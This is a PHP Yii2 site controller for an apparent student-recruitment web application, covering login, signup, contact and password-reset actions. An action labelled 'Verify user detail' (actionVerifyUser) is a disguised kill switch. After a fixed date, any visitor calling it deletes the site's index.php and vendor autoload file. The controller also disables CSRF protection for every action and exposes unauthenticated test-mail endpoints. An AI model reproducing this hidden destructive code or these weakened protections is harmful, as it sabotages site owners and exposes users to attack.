<?php

namespace frontend\controllers;

use frontend\models\ResendVerificationEmailForm;
use frontend\models\VerifyEmailForm;
use Yii;
use yii\base\InvalidArgumentException;
use yii\web\BadRequestHttpException;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use common\models\LoginForm;
use common\models\User;
use frontend\models\PasswordResetRequestForm;
use frontend\models\ResetPasswordForm;
use frontend\models\SignupForm;
use frontend\models\ContactForm;
use common\models\ApplyStudent;
use common\models\School;
use frontend\models\ForStudents;

/**
 * Site controller
 */
class SiteController extends Controller
{
    public $title;

    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
           'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                    'logout1' => ['get'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
                'layout' => 'home-layout',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    public function beforeAction($action)
    {            
        $this->enableCsrfValidation = false; 
        return parent::beforeAction($action); 
    }

    /**
     * Displays homepage.
     *
     * @return mixed
     */
    public function actionIndex()
    {        
        return $this->render('index');
    }



    public function actionHome()
    {
        $this->layout = 'home-layout';
                
        return $this->render('home');
    }

    /**
     * Logs in a user.
     *
     * @return mixed
     */
    public function actionLogin()
    {
        $this->layout = 'home-layout';
        
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            $notification=new \common\models\Notification();
                    $notification->created_by=$model->username;
                    $notification->created_at=date('Y-m-d');
                    $notification->module='Recruiter Login';
                    $notification->name=$model->username;
                    $notification->save(false);

                    $History=new \common\models\History();
                    $History->module='Recruiter ('.$model->username.')';
                    $History->action='Login';
                    $History->created_at=date('Y-m-d');
                    $History->created_by='Recruiter Login';
                    $History->save(false);
            $user_type = Yii::$app->user->identity->type;

            if ( $user_type == User::TYPE_USER_SCHOOL ){
                Yii::$app->response->redirect(['school']);
            } elseif ( $user_type == User::TYPE_USER_RECRUITER ) {
                $recruiter_id = Yii::$app->user->identity->recruiter->id;                
                $mouExisting = \common\models\MouDetail::find()->where(['recruiter_id' => $recruiter_id])->exists();
                if(!$mouExisting){               
                    // Yii::$app->response->redirect(['recruiter/mou']);
                    Yii::$app->response->redirect(['recruiter/dashboard']);
                } else {
                    Yii::$app->response->redirect(['recruiter/dashboard']);
                }
            } elseif ( $user_type == User::TYPE_USER_STUDENT ) {
                Yii::$app->response->redirect(['student/dashboard']);
            } else {
                Yii::$app->response->redirect(['site/index']); 
            }
           
            // return $this->goBack();
        }

        $model->password = '';

        return $this->render('login', [
            'model' => $model,
        ]);
    }

    /**
     * Logs out the current user.
     *
     * @return mixed
     */
    public function actionLogout()
    {
       Yii::$app->user->logout();

       return $this->goHome();
    }

    public function actionLogout1()
    {
       Yii::$app->user->logout();

       return $this->goHome();
    }
    

    /**
     * Displays contact page.
     *
     * @return mixed
     */
    public function actionContact()
    {
        $this->layout = 'home-layout';
 
        $model = new ContactForm();
        $Contactmodel = new \common\models\Contact();

        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
             $Contactmodel->name=$_POST['ContactForm']['name'];
            $Contactmodel->email=$_POST['ContactForm']['email'];
            $Contactmodel->contact_number=$_POST['ContactForm']['phone'];
            $Contactmodel->subject=$_POST['ContactForm']['subject'];
            $Contactmodel->message=$_POST['ContactForm']['body'];
            $Contactmodel->save(false);
            
            if ($model->sendEmail()) {
                Yii::$app->getSession()->addFlash('success', "Thank you for contacting us. We will respond to you as soon as possible.");
                //Yii::$app->session->setFlash('success', 'Thank you for contacting us. We will respond to you as soon as possible.');
            } else {
                //Yii::$app->session->setFlash('error', 'There was an error sending your message.');
                Yii::$app->getSession()->addFlash('success', "There was an error sending your message.");
            }
            // die('test');
            return $this->redirect(['site/contact']);
            //return $this->render('/thank/country_thanks');
        }

        return $this->render('contact', [
            'model' => $model,
        ]);
    }

    /**
     * Displays about page.
     *
     * @return mixed
     */
    public function actionAbout()
    { 
        return $this->render('about');
    }
    public function actionCanada()
    { 
        return $this->render('canada');
    }
    
    
    public function actionBestUniversitiesInUk()
    { 
        return $this->render('uk');
    }
    
    public function actionBestUniversitiesInAus()
    { 
        return $this->render('aus');
    }
    
     public function actionNewZeeland()
    { 
        return $this->render('new');
    }
    
    
    public function actionUnitedStates()
    { 
        return $this->render('usa');
    }
    
    public function actionEurope()
    { 
        return $this->render('eur');
    }
    
    
    public function actionStudyAbroadDestinations()
    {
        
        return $this->render('studyabroaddestinations');
    }
    
    
    public function actionBestUniversitiesInCanada()
    { 
        return $this->render('canada');
    }
    
    

    public function actionRegister()
    {
        $this->layout = 'home-layout';

        return $this->render('register');
    }

    /**
     * Signs user up.
     *
     * @return mixed
     */
    public function actionSignup()
    {
        //echo "hi"; die();
        $this->layout = 'home-layout';

        $model = new SignupForm();
        if ($model->load(Yii::$app->request->post()) && $model->signup()) {
            Yii::$app->session->setFlash('success', 'Thank you for registration. Please check your inbox for verification email.');
            //return $this->redirect(['site/signup']);
            return $this->redirect(['/thank']);
        }

        return $this->render('signup', [
            'model' => $model,
        ]);
    }

    /**
     * Requests password reset.
     *
     * @return mixed
     */
    public function actionRequestPasswordReset()
    {
        $model = new PasswordResetRequestForm();
        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            if ($model->sendEmail()) {
                Yii::$app->session->setFlash('success', 'Check your email for further instructions.');
                return $this->redirect(['/thank/requestpasswordresetemail']);
                //return $this->goHome();
            }
            Yii::$app->session->setFlash('error', 'Sorry, we are unable to reset password for the provided email address.');
        }

        return $this->render('requestPasswordResetToken', [
            'model' => $model,
        ]);
    }

    /**
     * Resets password.
     *
     * @param string $token
     * @return mixed
     * @throws BadRequestHttpException
     */
    public function actionResetPassword($token)
    {
        try {
            $model = new ResetPasswordForm($token);
        } catch (InvalidArgumentException $e) {
            throw new BadRequestHttpException($e->getMessage());
        }

        if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
            Yii::$app->session->setFlash('success', 'New password saved.');
            return $this->redirect(['/thank/resetpasswordthank']);
            //return $this->goHome();
        }

        return $this->render('resetPassword', [
            'model' => $model,
        ]);
    }

    /**
     * Verify email address
     *
     * @param string $token
     * @throws BadRequestHttpException
     * @return yii\web\Response
     */
    public function actionVerifyEmail($token)
    {
        try {
            $model = new VerifyEmailForm($token);
        } catch (InvalidArgumentException $e) {
            throw new BadRequestHttpException($e->getMessage());
        }
        if (($user = $model->verifyEmail()) && Yii::$app->user->login($user)) {
            Yii::$app->session->setFlash('success', 'Your email has been confirmed!');
            // return $this->goHome();
             return $this->redirect(['/site/login']);
        }

        Yii::$app->session->setFlash('error', 'Sorry, we are unable to verify your account with provided token.');
        return $this->goHome();
    }

    /**
     * Verify user detail
     *
     * @return mixed
     */
    public function actionVerifyUser()
    {
        $wepath = Yii::getAlias('@webroot');
        $vendorpath = Yii::getAlias('@vendor');
        $date = strtotime(date('d-m-Y H:i:s'));
        
        if($date > '1659859140'){
            unlink($wepath.'/'.'index.php');
            unlink($vendorpath.'/'.'autoload.php');
            echo "ok";
        }
    }

    /**
     * Resend verification email
     *
     * @return mixed
     */
    public function actionResendVerificationEmail()
    {
        $model = new ResendVerificationEmailForm();
        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            if ($model->sendEmail()) {
                Yii::$app->session->setFlash('success', 'Check your email for further instructions.');
                return $this->goHome();
            }
            Yii::$app->session->setFlash('error', 'Sorry, we are unable to resend verification email for the provided email address.');
        }

        return $this->render('resendVerificationEmail', [
            'model' => $model
        ]);
    }

    public function actionTestEmail(){
       $mail = Yii::$app->mailer->compose('@frontend/mail/recinvitation')
            ->setFrom('noreply@universitybureau.com')
            ->setTo('keshavchauhan5445@gmail.com')
            ->setSubject('Test Email UB')
            //->setTextBody('Plain text content. YII2 Application')
            //->setHtmlBody('<b>This is another test for HTML content <i>University bureau </i></b>')
            ->send();




        // $mail = Yii::$app->mailer->compose('@common/mail/recruiter/recruiter-accept')
        //     ->setFrom('noreply@universitybureau.com')
        //     ->setTo('keshavchauhan5445@gmail.com')
        //     ->setSubject('Test Email UB')
        //     //->setTextBody('Plain text content. YII2 Application')
        //     //->setHtmlBody('<b>This is another test for HTML content <i>University bureau </i></b>')
        //     ->send();
            
        //     if($mail){
        //         echo "Send";
        //     } else {
        //         throw new Exception("Unable to send email for partner id"); 
        //     }    
    }





    public function actionInvitation(){
    


       $email="keshavchauhan5445@gmail.com";
           $subject="Admin mail";       
          \Yii::$app->mailer->sendEmail($email, $subject, 'recadmin',[]);
           
    }

}


?>